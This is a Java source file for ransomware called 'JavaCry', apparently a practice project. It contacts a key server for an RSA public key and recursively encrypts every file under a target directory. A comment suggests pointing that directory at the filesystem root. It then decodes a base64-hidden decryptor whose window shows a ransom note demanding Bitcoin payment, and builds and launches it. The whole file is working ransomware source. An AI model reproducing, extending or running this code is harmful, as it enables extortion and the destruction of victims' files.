import java.util.*;
import java.util.stream.Collectors;
import java.net.*;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.stream.Stream;

import java.math.BigInteger;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.*;
import java.security.spec.X509EncodedKeySpec;



public class JavaCry {
/*
   Dangerous target paths:
   Mac & Linux:
   private static String targetPath = "/";

   Windows:
   private static String targetPath = "C:\";
 */
private static String targetPath = "/Users/daniel/Desktop/java_practice/JavaCry/Test_Env";
private static String os = System.getProperty("os.name").split(" ")[0];
private static List<Path> files = new ArrayList<Path>();
private static Random rand = new Random(System.currentTimeMillis());
private static int id = (int)(rand.nextInt(Integer.MAX_VALUE));
private static RSACrypt crypto;
private static String decryptorPayload = "aW1wb3J0IGphdmEuYXd0Lio7CgovKgogIGRlY3J5cHRvcjoKICBCVEMgcGF5bWVudCBpbnRlcmZhY2UKICBSZXF1ZXN0IGZvciBkZWNyeXB0aW9uIGZ1bmN0aW9uYWxpdHkKICBpZiByZWNlaXZlcyB0aGUga2V5LCB1c2UgdGhlIGtleSB0byBkZWNyeXB0IHRoZSBmaWxlcwogIGRlc3Ryb3kgZGVjcnlwdG9yLmphdmEKKi8KCmNsYXNzIERlY3J5cHRvciB7CiAgcHJpdmF0ZSBzdGF0aWMgaW50IGlkID0gMDsKICAgLy8gaW5pdGlhbGl6aW5nIHVzaW5nIGNvbnN0cnVjdG9yCiAgIERlY3J5cHRvcigpIHsKICAgICAgU3RyaW5nIG5vdGUgPSAiSWYgeW91IHdhbnQgdG8gZGVjcnlwdCB5b3VyIGZpbGVzLCBwbGVhc2UgY29weSB0aGUgY29udGVudCBvZiBzZW5kdG9tZS50eHQgc2VuZCBpdCB3aXRoICQxIEJUQyB0byA8YWRkcmVzcz4uIFxuIiArCiAgICAgICAgICAgICAgICAgICAgIllvdSBjYW4gZ2VuZXJhdGUgdGhlIHRyYW5zYWN0aW9uIG91dHB1dCB3aXRoIGh0dHBzOi8vYnRjbWVzc2FnZS5jb20vLCBhbmQgY29weSBpdCB0byB5b3VyIEJUQyB3YWxsZXQgdG8gXG4iICsKICAgICAgICAgICAgICAgICAgICAic2VuZCBtZSB5b3VyIG1vbmV5LiBJIHdpbGwgY2hlY2sgeW91ciBwYXltZW50cyBiZWZvcmUgYXBwcm92aW5nIHlvdXIgcmVxdWVzdCBmb3IgZGVjcnlwdGlvbiI7CiAgICAgIC8vIGNyZWF0aW5nIGEgRnJhbWUKICAgICAgRnJhbWUgZiA9IG5ldyBGcmFtZSgpOwoKICAgICAgLy8gY3JlYXRpbmcgYSBMYWJlbAogICAgICBMYWJlbCBoZWFkZXIgPSBuZXcgTGFiZWwoIllvdXIgZmlsZXMgaGF2ZSBiZWVuIGVuY3J5cHRlZC4iKTsKICAgICAgTGFiZWwgbCA9IG5ldyBMYWJlbChub3RlKTsKCiAgICAgIC8vIGNyZWF0aW5nIGEgQnV0dG9uCiAgICAgIEJ1dHRvbiBiID0gbmV3IEJ1dHRvbigiUmVxdWVzdCBmb3IgRGVjcnlwdGlvbiIpOwoKCiAgICAgIC8vIHNldHRpbmcgcG9zaXRpb24gb2YgYWJvdmUgY29tcG9uZW50cyBpbiB0aGUgZnJhbWUKICAgICAgaGVhZGVyLnNldEJvdW5kcygyMCwgNTAsIDI1MCwgMzApOwogICAgICBsLnNldEJvdW5kcygyMCwgODAsIDEwMDAsIDMwKTsKICAgICAgYi5zZXRCb3VuZHMoMTAwLCAxMDAsIDIwMCwgMzApOwoKICAgICAgLy8gYWRkaW5nIGNvbXBvbmVudHMgaW50byBmcmFtZQogICAgICBmLmFkZChoZWFkZXIpOwogICAgICBmLmFkZChiKTsKICAgICAgZi5hZGQobCk7CgogICAgICAvLyBmcmFtZSBzaXplIDMwMCB3aWR0aCBhbmQgMzAwIGhlaWdodAogICAgICBmLnNldFNpemUoMTIwMCw2MDApOwoKICAgICAgLy8gc2V0dGluZyB0aGUgdGl0bGUgb2YgZnJhbWUKICAgICAgZi5zZXRUaXRsZSgiSmF2YUNyeSBEZWNyeXB0b3IiKTsKCiAgICAgIC8vIG5vIGxheW91dAogICAgICBmLnNldExheW91dChudWxsKTsKCiAgICAgIC8vIHNldHRpbmcgdmlzaWJpbGl0eSBvZiBmcmFtZQogICAgICBmLnNldFZpc2libGUodHJ1ZSk7Cn0KCi8vIG1haW4gbWV0aG9kCnB1YmxpYyBzdGF0aWMgdm9pZCBtYWluKFN0cmluZyBhcmdzW10pIHsKCi8vIGNyZWF0aW5nIGluc3RhbmNlIG9mIEZyYW1lIGNsYXNzCkRlY3J5cHRvciBhd3Rfb2JqID0gbmV3IERlY3J5cHRvcigpOwp9Cgp9Cg==";
private static Process process;
// decrypt files from a list of paths
public static void decryptFiles(String keyString) {
        crypto.setPubKey(keyString);

        for (Path p : files) {
                try {
                        File f = p.toFile();
                        crypto.decrypt(f);
                } catch (Exception e) {
                        System.out.println(e);
                }
        }
}

// encrypt files from a list of paths
public static void encryptFiles() {
        for (Path p : files) {
                try {
                        File f = p.toFile();
                        crypto.encrypt(f);
                } catch (Exception e) {
                        System.out.println(e);
                }
        }
}

public static String replaceLine(String src, int lineno, String content) {
        String out = "";
        String[] lines = src.split("\n");
        for (int i = 0; i < lines.length; i++) {
                if (i+1 == lineno) {
                        out += content + "\n";
                } else {
                        out += lines[i] + "\n";
                }
        }
        return out;
}

public static void main(String[] args) {
        System.out.println("done");
        System.out.println("You're on " + os); // Windows Mac Linux SunOS FreeBSD

        KeyClient key_client = new KeyClient("127.0.0.1", 6666);
        if (key_client.getSuccess()) {

                try {
                        // send id hash to server
                        MessageDigest md = MessageDigest.getInstance("SHA-256");
                        byte[] hash = md.digest(String.valueOf(id).getBytes(StandardCharsets.UTF_8));
                        String b64hash = Base64.getEncoder().encodeToString(hash);
                        key_client.sendString(b64hash);

                        // received allocated public key
                        String b64pubkey = key_client.recvString();
                        byte[] pub = Base64.getDecoder().decode(b64pubkey);
                        X509EncodedKeySpec spec = new X509EncodedKeySpec(pub);
                        KeyFactory factory = KeyFactory.getInstance("RSA");
                        PublicKey public_key = factory.generatePublic(spec);

                        crypto = new RSACrypt(public_key);

                        key_client.close();
                } catch (Exception e) {
                        System.out.println(e);
                        return;
                }

                // encrypt files recursively within the target directory
                try (Stream<Path> paths = Files.walk(Paths.get(targetPath))) {
                        files = paths.filter(Files::isRegularFile).collect(Collectors.toList());
                }
                catch (Exception e) {
                        ;
                }

                // This will encrypt files recursively in the target directory
                encryptFiles();
                crypto.SaveAESKey();


                try {
                        File f = new File("Decryptor.java");
                        if (!f.exists()) {
                                f.createNewFile();
                        }
                        File m = new File("manifest.txt");
                        if (!m.exists()) {
                                m.createNewFile();
                        }

                        // create Decryptor.jar
                        String code = new String(Base64.getDecoder().decode(decryptorPayload));
                        code = replaceLine(code, 12, "private static int id = " + String.valueOf(id) + ";");
                        FileWriter writer = new FileWriter("Decryptor.java");
                        PrintStream manifest = new PrintStream(new File("manifest.txt"));
                        manifest.println("Main-Class: Decryptor");
                        writer.write(code);
                        writer.close();

                        // run Decryptor.java
                        process = Runtime.getRuntime().exec(String.format("javac Decryptor.java", System.getProperty("user.home")));
                        BufferedReader b = new BufferedReader(new InputStreamReader(process.getInputStream()));

                        String s;
                        while ((s = b.readLine()) != null) {
                                System.out.println(s);
                        }
                        b.close();

                        process = Runtime.getRuntime().exec(String.format("jar -cvmf manifest.txt Decryptor.jar Decryptor.class ", System.getProperty("user.home")));
                        b = new BufferedReader(new InputStreamReader(process.getInputStream()));

                        while ((s = b.readLine()) != null) {
                                System.out.println(s);
                        }
                        b.close();

                        if (f.delete()) {
                                System.out.println("Deleted the file: " + f.getName());
                        } else {
                                System.out.println("Failed to delete the file.");
                        }
                        if (m.delete()) {
                                System.out.println("Deleted the file: " + m.getName());
                        } else {
                                System.out.println("Failed to delete the file.");
                        }

                        File classFile = new File("Decryptor.class");
                        if (classFile.delete()) {
                                System.out.println("Deleted the file: " + classFile.getName());
                        } else {
                                System.out.println("Failed to delete the file.");
                        }


                        process = Runtime.getRuntime().exec(String.format("java -jar Decryptor.jar", System.getProperty("user.home")));

                } catch (Exception e) {
                        System.out.println(e);
                }

        }
}
}
